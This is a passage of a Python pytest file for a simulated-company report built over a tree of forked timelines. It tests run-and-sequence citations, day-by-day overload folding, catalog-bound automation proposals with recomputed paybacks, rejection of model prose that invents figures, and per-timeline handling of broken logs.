"""The Universe report: one artifact over a whole tree of timelines (U20).

M53, M55, M56 and M59. The claims worth pinning here are the ones that stop being obvious the
moment a lineage has more than one timeline in it:

* **the report is identified by its root, not by where the player is standing.** Asking from a
  child and asking from its parent must produce the same artifact, because U22 mails this file
  to somebody and a document whose identity moved with a camera would be a different document
  every time it was exported;
* **a sequence stopped being an address.** A fork copies its parent's rows verbatim, so sequence
  42 exists in the parent and in every child — below the divergence it is the same event, above
  it, it is not. Every claim carries the pair, and the test for that is mechanical rather than
  by inspection;
* **overload is folded, because the log does not carry it.** `LOAD_CHANGED` fires only on a day
  that produced morale counters, so a line can sit over its ceiling for days with the log
  silent. There is a regression test for that measurement, so that nobody simplifies the fold
  away and back onto the events;
* **the Universe folds the same day the diff folds.** Two different fold strategies over one log
  — the diff from zero, the Universe resumed day by day — and they agree on the state hash, the
  metrics and the load, or the product's two read surfaces disagree about one company;
* **one timeline that cannot be folded costs its own section.** Not the report, and not
  everything downstream of it.
"""

from __future__ import annotations

import dataclasses
import re

import pytest
from fastapi.testclient import TestClient

from conftest import SEED, Recorder, build_lineage, kernel_on, played
from contracts import canonical
from contracts.envelope import Envelope, EventKind
from logschema import lineage as lin
from report import export as exporting
from report import fold as reporting
from report import manifest as declaring
from report import proposals as prescribing
from report import universe as universes
from simcore import capacity as cap
from simcore import compare as comparing
from simcore import hashing
from simcore import scenario as scenarios
from simcore import step as sim
from simcore import time as simtime

ROOT = "run-universe"

#: The second shipped company, whose People line is a single person carrying the hiring work. It
#: is authored **over its ceiling at genesis** — 1288 per-mille against 1000 — which makes it the
#: honest fixture for M56: a real company, over its ceiling for a real reason, rather than a
#: department inflated by a test to produce the answer the test wants.
OVERLOADED = "ashcroft"
OVERLOADED_LINE = "hr"


# =========================================================================
# A tree, without a store
# =========================================================================
#
# The store is what makes a fork, and most of what is asserted here is not about forking. A
# `Tree` is a dataclass over row values, so a lineage's *shape* can be stated directly and the
# logs handed alongside it — which is exactly what the route does after it has read both.


def _node(run_id: str, parent: str = "", **overrides) -> lin.Node:
    fields: dict = {
        "run_id": run_id,
        "parent_run_id": parent,
        "forked_at_seq": 0,
        "tick": 0,
        "day": 1,
        "rate": 0,
        "head_seq": 0,
        "terminal_reason": "",
        "created_at": "2026-09-13T00:00:00.000+00:00",
    }
    fields.update(overrides)
    return lin.Node(**fields)


def _tree_of(*recorders: Recorder) -> tuple[lin.Tree, dict[str, reporting.TimelineLog]]:
    """A lineage whose first recorder is the root and whose rest are forks of it.

    The divergence fields are filled in for the children so the report has something to name as
    the separation; what they say is not what these tests are about, and the tests that are about
    it use a real fork through the kernel.
    """
    nodes = [_node(recorders[0].run_id, tick=recorders[0].state.tick)]
    for index, recorder in enumerate(recorders[1:], start=1):
        nodes.append(
            _node(
                recorder.run_id,
                recorders[0].run_id,
                tick=recorder.state.tick,
                forked_at_seq=4,
                item="wi_ap_map",
                cp_index=0,
                option_index=index,
                parent_option_index=0,
                choice=f"option {index}",
                parent_choice="option 0",
            )
        )
    tree = lin.Tree(
        root_run_id=recorders[0].run_id,
        asked_about=recorders[0].run_id,
        nodes=tuple(nodes),
    )
    return tree, {recorder.run_id: recorder.timeline() for recorder in recorders}


def _overloaded(run_id: str = "run-over", days: int = 6) -> Recorder:
    """A run of the company whose People line is over its ceiling from day one."""
    recorder = Recorder(run_id, scenario=scenarios.load(OVERLOADED))
    recorder.advance_until(lambda s: s.tick >= simtime.tick_of_day_start(days))
    return recorder


def _built(*recorders: Recorder) -> universes.Universe:
    tree, logs = _tree_of(*recorders)
    return universes.build(tree, logs)


# =========================================================================
# One report over a whole tree (M53)
# =========================================================================


def test_a_lineage_of_three_timelines_is_one_report_identified_by_its_root(lineage) -> None:
    """M53, over a real fork on both dialects.

    A parent and two children of one decision, forked through `KernelRuntime` — so each child's
    log really is its parent's rows up to the divergence, which is the condition every claim in
    this file is written against.
    """
    universe = _over(lineage, lineage.root)

    assert universe.root_run_id == lineage.root
    assert [entry.run_id for entry in universe.timelines] == lineage.timelines
    assert all(entry.refusal == "" for entry in universe.timelines), [
        (entry.run_id, entry.refusal) for entry in universe.timelines
    ]
    assert all(entry.report is not None for entry in universe.timelines)


def test_the_report_is_the_same_whichever_timeline_names_it(lineage) -> None:
    """The identity is the lineage root, and never the timeline the player is standing in.

    This is what makes the export a document about a company rather than about a camera
    position. `asked_about` is the only thing allowed to differ, and it is there so a surface can
    mark where the player is — not so the artifact can.
    """
    from_root = _over(lineage, lineage.root).to_dict()
    from_child = _over(lineage, lineage.children[0]).to_dict()

    assert from_child["asked_about"] == lineage.children[0]
    assert from_root["asked_about"] == lineage.root

    from_root.pop("asked_about")
    from_child.pop("asked_about")
    assert from_root == from_child, "the report changed with the timeline that asked for it"


def test_a_child_names_the_decision_that_separated_it_and_the_root_names_none(lineage) -> None:
    universe = _over(lineage, lineage.root)
    by_run = {entry.run_id: entry for entry in universe.timelines}

    assert by_run[lineage.root].separation == {}, "the root was not separated from anything"
    for child in lineage.children:
        separation = by_run[child].separation
        assert separation["from_run_id"] == lineage.root
        assert separation["item"] == "wi_hiring"
        assert separation["at_seq"] == lineage.decision_seq
        assert separation["option_index"] != separation["parent_option_index"]


# =========================================================================
# Every claim resolves to a run and a sequence (M55)
# =========================================================================


def test_every_claim_resolves_to_a_run_and_a_sequence(lineage) -> None:
    """Mechanically, against the logs themselves, rather than by reading the payload."""
    universe = _over(lineage, lineage.root)
    logs = {run_id: {event.seq for event in lineage.events(run_id)} for run_id in lineage.timelines}

    assert universe.claims
    for claim in universe.claims:
        assert claim.run_id in logs, f"{claim.label} names no timeline of this Universe"
        assert claim.at_seq in logs[claim.run_id], (
            f"{claim.label} cites sequence {claim.at_seq}, which is not in {claim.run_id}"
        )


def test_a_bare_sequence_would_be_ambiguous_and_the_pair_is_not(lineage) -> None:
    """The reason the run id had to go on the claim, stated as a measurement.

    A fork copies its parent's rows, so the same sequence addresses a real event in every
    timeline of the lineage. This asserts both halves: that the ambiguity is real — one sequence,
    several timelines, several claims — and that no two claims in the report share the pair.
    """
    universe = _over(lineage, lineage.root)

    by_seq: dict[int, set[str]] = {}
    for claim in universe.claims:
        by_seq.setdefault(claim.at_seq, set()).add(claim.run_id)
    shared = {seq: runs for seq, runs in by_seq.items() if len(runs) > 1}
    assert shared, "no sequence was claimed by two timelines, so this proves nothing"

    addressed = [(claim.run_id, claim.at_seq, claim.label) for claim in universe.claims]
    assert len(addressed) == len(set(addressed)), "two claims share a run, a sequence and a label"


def test_the_overload_figures_resolve_to_their_day_checkpoints() -> None:
    """A folded figure still names an event: the checkpoint the kernel wrote at that boundary."""
    recorder = _overloaded()
    universe = _built(recorder)
    seqs = {event.seq: event for event in recorder.log}

    readings = universe.timelines[0].readings
    assert readings
    for reading in readings:
        cited = seqs[reading.at_seq]
        assert cited.kind in (EventKind.DAY_CHECKPOINT, EventKind.GENESIS)
        assert reporting.fold_tick_of(cited) == reading.at_tick

    for span in universe.timelines[0].spans:
        assert span.opened_at_seq in seqs and span.peak_at_seq in seqs


# =========================================================================
# Where the company was overloaded, and when (M56)
# =========================================================================


def test_a_line_over_its_ceiling_is_reported_by_line_and_by_day() -> None:
    """M56, on a company that is authored over its ceiling rather than driven there."""
    universe = _built(_overloaded(days=6))
    spans = universe.timelines[0].spans

    assert [span.line for span in spans] == [OVERLOADED_LINE]
    span = spans[0]
    assert (span.from_day, span.to_day) == (1, 6)
    assert span.days == 6
    assert span.peak_permille > cap.LOAD_CEILING
    assert universe.load_scale["ceiling_permille"] == cap.LOAD_CEILING


def test_the_load_events_in_the_log_do_not_cover_the_overload() -> None:
    """The plan's claim that the load events already carry this, disproved and pinned.

    `LOAD_CHANGED` is emitted only on a day that produced morale counters, so a line goes over
    its ceiling and the log says nothing until somebody's morale has fallen far enough. Measured
    separately on a driven run of the shipped company: twelve consecutive days over the ceiling,
    named by the log on three of them.

    This is a regression test for a *decision*, not for a behaviour: it fails if somebody moves
    the overload section back onto the events, and the failure says why.
    """
    recorder = _overloaded(days=6)
    universe = _built(recorder)

    days_over = {
        reading.day for reading in universe.timelines[0].readings if reading.over
    }
    named_by_the_log = {
        int(event.decoded_payload()["day"])
        for event in recorder.log
        if event.kind is EventKind.LOAD_CHANGED
    }

    assert days_over, "the fixture is not overloaded, so this proves nothing"
    assert not days_over <= named_by_the_log, (
        "the log named every overloaded day, so the fold is no longer needed — check "
        "whether LOAD_CHANGED stopped being conditional on morale counters before deleting it"
    )


def test_a_day_back_under_the_ceiling_closes_a_span() -> None:
    """Load is sampled where the simulation charges for it, so a day under is a day not paid for."""
    readings = [
        universes.LoadReading(
            run_id="r", director="dir_x", line="admin", day=day, at_tick=day * 540,
            at_seq=day, load_permille=load, over=load > cap.LOAD_CEILING,
        )
        for day, load in enumerate([1200, 1100, 900, 1300, 1400], start=1)
    ]

    spans = universes.spans_of(readings)

    assert [(span.from_day, span.to_day) for span in spans] == [(1, 2), (4, 5)]
    assert [span.peak_permille for span in spans] == [1200, 1400]
    assert [span.peak_day for span in spans] == [1, 5]


def test_days_over_are_not_summed_across_timelines() -> None:
    """The double count a tree invites, and the shape that refuses to make it.

    Three timelines sharing a prefix hold the same overloaded days three times. A tree-wide total
    would report a company three times as overloaded as it was, so the tree-wide figure is *how
    many timelines*, and the days stay under the timeline they belong to.
    """
    universe = _built(_overloaded("run-a"), _overloaded("run-b"), _overloaded("run-c"))
    line = next(entry for entry in universe.overload if entry.line == OVERLOADED_LINE)

    assert (line.timelines_over, line.timelines) == (3, 3)
    assert line.everywhere
    assert line.peak is not None and line.peak.load_permille > cap.LOAD_CEILING
    assert line.first_over is not None and line.first_over.day == 1

    per_timeline = {
        entry.run_id: sum(span.days for span in entry.spans) for entry in universe.timelines
    }
    assert set(per_timeline.values()) == {6}, per_timeline


def test_a_line_nobody_overloaded_is_reported_as_such(lineage) -> None:
    """Every line is present, including the ones with nothing to say about them.

    A report that listed only the overloaded lines would leave a reader unable to tell a healthy
    line from one the report forgot.
    """
    universe = _over(lineage, lineage.root)

    assert {entry.line for entry in universe.overload} == {"admin", "sales", "support", "hr"}
    for entry in universe.overload:
        assert entry.timelines_over == 0 and not entry.everywhere
        assert entry.peak is None and entry.first_over is None


# =========================================================================
# The Universe folds the day the diff folds
# =========================================================================


def test_walking_the_days_once_agrees_with_folding_each_from_zero() -> None:
    """The optimisation, and the equality that is the whole of its licence.

    `state_at_day` is what the diff calls, and it folds from zero. The Universe walks the days
    once and resumes each from the last. Measured on a 30-day timeline of 123 events: 2617 ms
    against 254 ms. They must produce the same state, or the report and the diff are two
    readings of one log.
    """
    recorder = played("run-walk", 0, 5)
    walked = list(reporting.walk_days(recorder.log, through_day=5))

    assert [folded.day for folded in walked] == [1, 2, 3, 4, 5]
    for folded in walked:
        from_zero, through_seq = reporting.state_at_day(recorder.log, folded.day)
        assert folded.state_hash == hashing.state_hash(sim.snapshot(from_zero)).overall
        assert folded.state.metrics == from_zero.metrics
        assert {
            director: department.load_permille
            for director, department in folded.state.capacity.items()
        } == {
            director: department.load_permille
            for director, department in from_zero.capacity.items()
        }
        assert through_seq >= folded.at_seq


def test_every_day_reproduces_the_hash_the_kernel_wrote_there() -> None:
    """R12 over a whole timeline: the strongest available form of "these are the same numbers"."""
    recorder = played("run-hashes", 1, 6)
    recorded = {
        int(event.decoded_payload()["tick"]): str(event.decoded_payload()["state_hash"])
        for event in recorder.log
        if event.kind is EventKind.DAY_CHECKPOINT
    }
    assert len(recorded) >= 4, "the fixture wrote too few boundaries to prove anything"

    for folded in reporting.walk_days(recorder.log, through_day=6):
        assert folded.agrees, f"day {folded.day} did not fold to the state the kernel was in"
        if folded.at_tick in recorded:
            assert folded.state_hash == recorded[folded.at_tick]


def test_the_universe_and_the_diff_report_one_company_at_one_day() -> None:
    """The report's figures match the diff's, for the same two timelines at the same day."""
    left = played("run-left", 0, 5)
    right = played("run-right", 1, 5)
    universe = _built(left, right)
    answer = reporting.diff(left.timeline(), right.timeline(), day=4)

    assert answer.refusal == ""
    for side, recorder in ((answer.left, left), (answer.right, right)):
        assert side is not None
        entry = universe.timeline_for(recorder.run_id)
        assert entry is not None
        walked = next(
            folded
            for folded in reporting.walk_days(recorder.log, through_day=4)
            if folded.day == 4
        )
        assert walked.state_hash == side.state_hash
        for row in answer.rows:
            if row.key in walked.state.metrics:
                value = row.left if side is answer.left else row.right
                assert value == walked.state.metrics[row.key]


# =========================================================================
# The marking, and what the report says about the company (M59)
# =========================================================================


def _figures(payload, found=None) -> list[dict]:
    """Every dict in the payload that carries a figure, found by a rule rather than by a list.

    The rule is the shape of a figure, not the name of a section: a dict holding a `value` or a
    per-mille reading is a figure and must say what it is. A list of sections to check would be a
    list somebody has to remember to extend, and the extension is exactly where the marking gets
    dropped.
    """
    found = [] if found is None else found
    if isinstance(payload, dict):
        if "value" in payload or any(key.endswith("_permille") for key in payload):
            found.append(payload)
        for value in payload.values():
            _figures(value, found)
    elif isinstance(payload, list):
        for value in payload:
            _figures(value, found)
    return found


def test_every_figure_carries_the_authored_tuning_marking() -> None:
    """R41 and M59, swept over the whole payload including every nested run report."""
    payload = _built(_overloaded(), played("run-plain", 0, 4)).to_dict()

    figures = _figures(payload)
    assert len(figures) > 40, f"the sweep found only {len(figures)} figures; it is not sweeping"
    for figure in figures:
        assert figure.get("basis") == universes.AUTHORED, figure

    assert payload["every_number_is"] == universes.AUTHORED


def test_the_report_says_plainly_that_the_company_is_invented() -> None:
    """M59's other half. Its reader has not seen the office and cannot be assumed to know."""
    payload = _built(_overloaded()).to_dict()
    company = scenarios.load(OVERLOADED)

    statement = payload["invented_company"]
    assert company.title in statement
    assert "invented company" in statement
    assert f"scenarios/{company.scenario_id}.toml" in statement
    assert payload["company"]["content_hash"] == company.content_hash


# =========================================================================
# What is worth automating (M57, M58)
# =========================================================================
#
# The prescription is the report's one prescriptive claim and the easiest thing in this product
# to make indefensible: "ask the model what to automate" satisfies a reading of M57, produces
# something that reads well, and states a payback for a company that does not exist. So what is
# pinned here is the three refusals that make it defensible instead —
#
# * **a candidate nobody authored cannot be proposed**, because the only door is the scenario's
#   `[[automation]]` table and `test_scenario.py` proves nothing else reads it;
# * **a candidate nobody's run overloaded is not proposed either**, however good it is;
# * **no figure comes from a model**, which is asserted by refusing one that does.


def _settled_overloaded(
    run_id: str = "run-over-settled", *, settle_on_day: int = 4, days: int = 7
) -> Recorder:
    """The overloaded company, with the decision on its automation's own work item taken late.

    `wk_freelance` is seeded at its own first checkpoint (M6), so it stops for the CEO on the
    opening frame — and the People line is over its ceiling for as long as it stands there.

    **The CEO is walked past it for three days first, and that is the fixture rather than an
    accident of it.** Settling on day one relieves the line at tick one: the option takes 18
    hours a month off the draw, the item finishes, and the report correctly proposes nothing,
    because there is nothing left to propose. Which is the product working — and is why a test
    about *citing* a decision has to let the pressure build before the decision is taken.
    """
    recorder = Recorder(run_id, scenario=scenarios.load(OVERLOADED))
    recorder.advance_until(lambda s: s.tick >= simtime.tick_of_day_start(settle_on_day))
    assert recorder.state.items["wk_freelance"].status == "blocked"
    recorder.record(
        sim.resolve_checkpoint(recorder.state, "wk_freelance", 0, 0, in_person=True)
    )
    recorder.advance_until(lambda s: s.tick >= simtime.tick_of_day_start(days))
    return recorder


def _busy_for_a_day(run_id: str = "run-busy", days: int = 9) -> Recorder:
    """The shipped company with one line briefly over its ceiling and then not.

    A real over-ceiling reading on a real run, lasting one day because the item burns down —
    which is the shape `MIN_OVERLOAD_DAYS` exists to distinguish from a standing problem.
    """
    recorder = Recorder(run_id)
    recorder.record(sim.assign_direct(recorder.state, "wi_faq", "stf_cs"))
    recorder.advance_until(lambda s: s.tick >= simtime.tick_of_day_start(days))
    return recorder


def test_a_line_over_its_ceiling_for_long_enough_is_proposed_with_events_and_a_payback() -> None:
    """M57, on the company authored over its ceiling.

    Every clause of the requirement, checked separately: the proposal comes from the catalog,
    it cites events, and it states a payback.
    """
    universe = _built(_overloaded())
    company = scenarios.load(OVERLOADED)

    assert universe.proposals, "a line over its ceiling for six days proposed nothing"
    authored = {candidate.id for candidate in company.automations}
    for proposal in universe.proposals:
        assert proposal.id in authored, "a proposal that is not in the catalog"
        assert proposal.evidence, proposal.id
        assert proposal.paybacks, proposal.id
        for payback in proposal.paybacks:
            assert payback.daily_saving > 0, proposal.id

    proposed = universe.proposal_for("au_freelancer_pack")
    assert proposed is not None and proposed.line == OVERLOADED_LINE
    assert proposed.everywhere, "one timeline, over the whole way; nothing escaped it"


def test_a_run_with_no_overload_proposes_nothing_rather_than_something() -> None:
    """The refusal that makes the other proposals worth reading.

    The shipped company idles under its ceiling, and it authors four candidates. None of them
    is proposed, and the payload says on what condition one would be.
    """
    universe = _built(played("run-plain", 0, 12))

    assert scenarios.load_default().automations, "the fixture proves nothing without a catalog"
    assert universe.proposals == []
    assert universe.to_dict()["proposals"] == []
    assert universe.to_dict()["prescription_rule"]["min_overload_days"] == (
        prescribing.MIN_OVERLOAD_DAYS
    )


def test_a_line_over_for_one_day_is_a_busy_day_and_not_a_proposal() -> None:
    """The threshold bites on a real reading rather than on an absent one.

    Customer Support really does go over — the span is in the report — and no proposal is made,
    because one day over is what a busy Tuesday looks like and the prescription is about the
    standing problem.
    """
    universe = _built(_busy_for_a_day())

    spans = [span for entry in universe.timelines for span in entry.spans]
    assert spans and all(span.days < prescribing.MIN_OVERLOAD_DAYS for span in spans)
    assert [line.line for line in universe.overload if line.timelines_over] == ["support"]
    assert universe.proposals == []


def test_a_payback_is_the_burn_the_log_charged_and_the_draw_taken_off_it() -> None:
    """M57's payback clause, recomputed against the kernel rather than against this module.

    Two independent facts, and the first is the one that makes the second mean anything:

    * `daily_burn_before` is not this report's opinion of the burn — it is byte-equal to the
      `total_cost` the kernel charged at the boundary the payback cites, read out of the log;
    * the saving is the *difference between two totals* through `step.draw_cost_of`, which is
      the function the day boundary itself divides by. The draw comes off the line, a draw is
      staffed work carried into the daily burn (R60), and the runway follows.

    And nothing is stored: the authored record carries hours and no money at all, asserted on
    its fields so a payback added to the format later fails here rather than quietly becoming
    a figure nobody recomputes.
    """
    recorder = _overloaded()
    universe = _built(recorder)
    proposal = universe.proposals[0]
    payback = proposal.paybacks[0]

    charged = [
        envelope.decoded_payload()
        for envelope in recorder.log
        if envelope.kind is EventKind.DAILY_COSTS_APPLIED
    ]
    at_the_boundary = next(
        entry for entry in charged if entry["tick"] == payback.at_tick
    )
    assert payback.daily_burn_before == at_the_boundary["total_cost"]

    removed = payback.removes_hours
    before = at_the_boundary["draw_cost"]
    after = sim.draw_cost_of(payback.manual_hours_before - removed)
    assert payback.daily_burn_after == payback.daily_burn_before - (before - after)
    assert payback.daily_saving == before - after

    cash = at_the_boundary["metrics"]["cash"]
    assert payback.runway_days_before == comparing.runway_days(cash, payback.daily_burn_before)
    assert payback.runway_days_after == comparing.runway_days(cash, payback.daily_burn_after)
    assert payback.runway_days_gained == (
        payback.runway_days_after - payback.runway_days_before
    )

    authored = {field.name for field in dataclasses.fields(scenarios.Automation)}
    assert authored == {
        "id",
        "line",
        "title",
        "detail",
        "removes_draw_hours_per_month",
        "motivated_by",
    }, "a scenario now authors a figure the report should be computing"


def test_a_payback_answers_the_question_its_own_evidence_raises() -> None:
    """A proposal is motivated by an overloaded line, so it has to say what it does to the load.

    Two halves, and the first is what makes the second checkable:

    * `load_permille_before` is the kernel's own recorded figure for that line at that boundary
      — the same number the overload section reports and the HUD showed, not a second reading;
    * `load_permille_after` is `capacity.load_permille`, the kernel's own function, over the
      same queue and the same headcount with a smaller draw. Recomputed here independently.
    """
    universe = _built(_overloaded())
    proposal = universe.proposals[0]
    payback = proposal.paybacks[0]
    timeline = universe.timelines[0]

    recorded = next(
        reading
        for reading in timeline.readings
        if reading.director == proposal.director and reading.day == payback.day
    )
    assert payback.load_permille_before == recorded.load_permille

    economy = timeline.economy
    assert economy is not None
    lighter = cap.DepartmentCapacity(
        director_id=proposal.director,
        monthly_hours=economy.line_hours[proposal.director] - payback.removes_hours,
    )
    assert payback.load_permille_after == cap.load_permille(
        lighter,
        economy.line_queued[proposal.director],
        economy.line_headcount[proposal.director],
    )
    assert payback.load_permille_removed == (
        payback.load_permille_before - payback.load_permille_after
    )


def test_a_proposal_says_whether_it_would_clear_the_ceiling_and_says_no() -> None:
    """The answer the reader wants, and on both shipped companies it is no.

    Measured across every line of both files: **the recurring draw is at most 222 per mille of a
    line's capacity** against a ceiling of 1000, so a line is only ever over its ceiling because
    of queued work, and the largest authored candidate moves the figure by 100. A proposal is
    therefore worth real money and is not the remedy for the overload that motivated it — which
    is a true thing about this economy's tuning, and the report says it rather than leaving the
    reader to infer that two numbers printed together are the same size.

    Pinned so that re-tuning the draws re-opens the question instead of quietly making this
    sentence false.
    """
    universe = _built(_overloaded())
    payback = universe.proposals[0].paybacks[0]

    assert payback.load_permille_before > cap.LOAD_CEILING
    assert payback.load_permille_after > cap.LOAD_CEILING
    assert payback.clears_the_ceiling is False
    assert payback.daily_saving > 0, "and it is still worth doing"

    for name in ("default", "ashcroft"):
        company = scenarios.load(name)
        for department in company.departments:
            people = len(company.lines.get(department.director, ()))
            capacity_units = (
                people * cap.AVAILABLE_SIM_HOURS_PER_DAY * cap.EFFORT_UNITS_PER_SIM_HOUR
            )
            draw = cap.daily_draw_units(department.draw_hours_per_month)
            assert draw * cap.LOAD_SCALE // capacity_units < cap.LOAD_CEILING, (
                f"{name}/{department.id}: the draw alone now exceeds the ceiling, so an "
                "automation can clear it and the sentence above needs rewriting"
            )


def test_clearing_the_ceiling_is_reported_when_the_draw_is_what_put_the_line_over() -> None:
    """The other side of the predicate, on an economy where the draw is the whole problem.

    Constructed rather than played, because no shipped company is tuned this way — which is the
    point of the test above. What it pins is that `clears_the_ceiling` is a real answer and not
    a field that is always no.
    """
    people = 2
    capacity_units = people * cap.AVAILABLE_SIM_HOURS_PER_DAY * cap.EFFORT_UNITS_PER_SIM_HOUR
    over = capacity_units // cap.DRAW_UNITS_PER_MONTHLY_HOUR + 1

    economy = prescribing.Economy(
        run_id="run-heavy",
        day=4,
        at_tick=simtime.tick_of_day_start(4),
        at_seq=12,
        cash=1000,
        fixed_cost=18,
        salaries=0,
        manual_hours=over,
        line_hours={"dir_cs": over},
        line_load={"dir_cs": cap.LOAD_SCALE + 1},
        line_queued={"dir_cs": 0},
        line_headcount={"dir_cs": people},
    )
    payback = prescribing.payback_of(
        economy, director="dir_cs", hours=over // 2, days_over=4
    )

    assert payback.load_permille_before > cap.LOAD_CEILING
    assert payback.load_permille_after <= cap.LOAD_CEILING
    assert payback.clears_the_ceiling is True


def test_a_proposal_cites_the_decision_the_ceo_took_on_its_own_work_item() -> None:
    """The other half of "the events that motivate it".

    A span says the line is under pressure. A settled checkpoint on the work that would relieve
    it says the CEO has already called it a problem out loud, which is the stronger citation —
    and it is why the catalog carries `motivated_by` at all.
    """
    recorder = _settled_overloaded()
    universe = _built(recorder)
    proposal = universe.proposal_for("au_freelancer_pack")
    assert proposal is not None

    settled = {
        envelope.seq
        for envelope in recorder.log
        if envelope.kind is EventKind.DECISION_RESOLVED
    }
    cited = {citation.at_seq for citation in proposal.evidence}

    assert settled and settled <= cited, (settled, cited)
    assert any("wk_freelance" in citation.note for citation in proposal.evidence)


def test_every_figure_the_prescription_states_resolves_to_an_event(lineage) -> None:
    """M55 over the new section, mechanically and over a real fork on both dialects."""
    universe = _over(lineage, lineage.root)
    held = {
        run_id: {envelope.seq for envelope in lineage.events(run_id)}
        for run_id in lineage.timelines
    }

    addressed = [
        (proposal.id, citation.run_id, citation.at_seq)
        for proposal in universe.proposals
        for citation in proposal.evidence
    ] + [
        (proposal.id, payback.run_id, payback.at_seq)
        for proposal in universe.proposals
        for payback in proposal.paybacks
    ]
    for proposal_id, run_id, at_seq in addressed:
        assert at_seq in held[run_id], (proposal_id, run_id, at_seq)

    labels = {claim.label for claim in universe.claims}
    for proposal in universe.proposals:
        assert f"daily burn saved by {proposal.id}" in labels


# --- the prose, and what it may not say (M58) ------------------------------


def _proposal() -> prescribing.Proposal:
    """One real proposal, off a real fold, to guard prose against."""
    universe = _built(_overloaded())
    assert universe.proposals
    return universe.proposals[0]


def _reply(proposal: prescribing.Proposal, text: str, citations=None) -> list[dict]:
    cited = sorted(proposal.citable())[:1] if citations is None else citations
    return [
        {
            "proposal": proposal.id,
            "sentences": [{"text": text, "citations": list(cited)}],
            "model_identity": "a-model",
        }
    ]


def test_with_no_model_the_proposals_carry_their_figures_and_say_the_prose_is_absent() -> None:
    """M20's rule, applied to the report: a run with no bench has no prose, not a canned one."""
    proposal = _proposal()

    assert proposal.note.status == prescribing.ABSENT
    assert proposal.note.sentences == ()
    assert proposal.evidence and proposal.paybacks
    assert proposal.to_dict()["note"]["written_by"] == ""


def test_prose_over_a_cited_figure_is_published_and_says_a_model_wrote_it() -> None:
    proposal = _proposal()
    figure = proposal.paybacks[0].daily_saving

    prescribing.attach(
        [proposal], _reply(proposal, f"Automating this takes {figure} off the daily burn.")
    )

    assert proposal.note.status == prescribing.WRITTEN, proposal.note.reason
    assert proposal.note.model_identity == "a-model"
    assert "a model" in proposal.to_dict()["note"]["written_by"]


def test_a_figure_that_came_from_the_model_is_refused() -> None:
    """M58, and the reason the requirement exists.

    The number below is the daily saving multiplied out over a year — the single most likely
    sentence a model writes over this evidence, arithmetically correct, and not a figure the
    fold produced. It is refused, and the refusal names it.
    """
    proposal = _proposal()
    invented = proposal.paybacks[0].daily_saving * 365
    assert invented not in proposal.resolvable(), "pick a figure the report does not state"

    prescribing.attach(
        [proposal], _reply(proposal, f"Over a year that is {invented} back in the bank.")
    )

    assert proposal.note.status == prescribing.REFUSED
    assert f"figure {invented}" in proposal.note.reason
    assert "M58" in proposal.note.reason


def test_a_sentence_with_nothing_behind_it_is_refused() -> None:
    proposal = _proposal()

    prescribing.attach([proposal], _reply(proposal, "This is the obvious one to do.", []))

    assert proposal.note.status == prescribing.REFUSED
    assert "cites nothing" in proposal.note.reason


def test_a_citation_outside_this_proposals_evidence_is_refused() -> None:
    proposal = _proposal()
    outside = max(proposal.citable()) + 1000

    prescribing.attach([proposal], _reply(proposal, "The line has been over for days.", [outside]))

    assert proposal.note.status == prescribing.REFUSED
    assert f"sequence {outside}" in proposal.note.reason


def test_prose_about_a_proposal_this_report_did_not_make_is_discarded() -> None:
    """The structural half of M57: a producer cannot add a proposal by naming one."""
    proposal = _proposal()
    reply = _reply(proposal, "An excellent idea.")
    reply[0]["proposal"] = "au_something_nobody_authored"

    prescribing.attach([proposal], reply)

    assert proposal.note.status == prescribing.ABSENT


def test_a_producer_that_could_not_answer_names_its_condition_rather_than_going_quiet() -> None:
    proposal = _proposal()

    prescribing.attach([proposal], [{"proposal": proposal.id, "refusal": "timeout"}])

    assert proposal.note.status == prescribing.REFUSED
    assert proposal.note.reason == "timeout"
    assert proposal.evidence and proposal.paybacks, "the figures survive a refused paragraph"


def test_the_two_guards_refuse_the_same_reply_for_the_same_reason() -> None:
    """One rule, two call sites, and the point of the second one is that it agrees.

    The producer's copy is the cheap one and keeps a refused reply out of the response cache;
    this module's is the auditable one, because it is what reaches the exported file. They are
    two implementations of a membership test over sets the report supplies, so the thing worth
    asserting is that they do not disagree.
    """
    from agents.bench import prescription

    proposal = _proposal()
    packet = proposal.to_packet()
    invented = max(proposal.resolvable()) + 7

    for text, expect in (
        (f"It saves {invented} a day.", True),
        (f"It saves {proposal.paybacks[0].daily_saving} a day.", False),
    ):
        point = prescription.Point(text=text, citations=tuple(sorted(proposal.citable())[:1]))
        here = prescribing.refusal_of(
            [prescribing.Sentence(text=text, citations=point.citations)], proposal
        )
        there = prescription.refusal_of((point,), packet)

        assert bool(here) is expect and bool(there) is expect, (text, here, there)


# =========================================================================
# What a tree can hold: an ended timeline, a broken one, a suspect one
# =========================================================================


def test_a_terminated_timeline_and_a_running_one_are_both_reported() -> None:
    ended = Recorder("run-ended", horizon_tick=simtime.TICKS_PER_SIM_DAY * 2)
    ended.advance_until(lambda s: bool(s.terminal_reason))
    running = played("run-running", 0, 4)

    universe = _built(ended, running)

    outcomes = {
        entry.run_id: entry.report.outcome["reason"]
        for entry in universe.timelines
        if entry.report is not None
    }
    assert outcomes["run-ended"] == "horizon"
    assert outcomes["run-running"] == "running"


def test_a_timeline_that_cannot_be_folded_costs_its_own_section_only() -> None:
    """One broken input must not take the report and everything downstream of it.

    A log written under different rules is refused by the fold by design (R10). The Universe
    reports that timeline's refusal where its figures would have been, and keeps the rest.
    """
    healthy = played("run-healthy", 0, 4)
    broken = played("run-broken", 1, 4)
    broken.log = [
        Envelope.from_dict({**event.to_dict(), "rules_ver": "not-the-running-rules"})
        for event in broken.log
    ]

    universe = _built(healthy, broken)
    by_run = {entry.run_id: entry for entry in universe.timelines}

    assert by_run["run-broken"].refusal
    assert "rules version" in by_run["run-broken"].refusal
    assert by_run["run-broken"].report is None and not by_run["run-broken"].trustworthy
    assert by_run["run-healthy"].report is not None and by_run["run-healthy"].trustworthy
    assert universe.claims, "one refused timeline emptied the whole report"
    assert all(claim.run_id == "run-healthy" for claim in universe.claims)


def test_a_hole_in_a_log_is_named_beside_that_timelines_figures() -> None:
    """Sequence density, `verify`'s cheap half, answered for every timeline in the tree.

    Beside the figures rather than instead of them: a reader deciding whether to trust a number
    wants the number and the reason to doubt it in the same place.
    """
    recorder = played("run-holed", 0, 4)
    recorder.log = [event for event in recorder.log if event.seq != 3]

    entry = _built(recorder).timelines[0]

    assert entry.missing_seqs == [3]
    assert not entry.trustworthy
    assert entry.report is not None, "a hole hid the figures rather than being reported beside them"


def test_a_day_that_does_not_fold_to_its_recorded_hash_is_named_and_localised() -> None:
    """`verify`'s other half, done in the walk rather than in a fold per boundary.

